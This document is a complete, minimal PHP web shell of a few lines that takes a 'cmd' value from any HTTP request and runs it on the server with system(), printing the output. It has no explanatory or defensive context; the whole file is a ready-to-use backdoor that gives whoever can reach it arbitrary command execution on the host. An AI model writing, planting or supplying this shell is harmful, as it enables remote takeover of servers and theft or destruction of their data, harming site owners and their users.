<?php
$cmd = $_REQUEST['cmd'];
if ($cmd) {
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
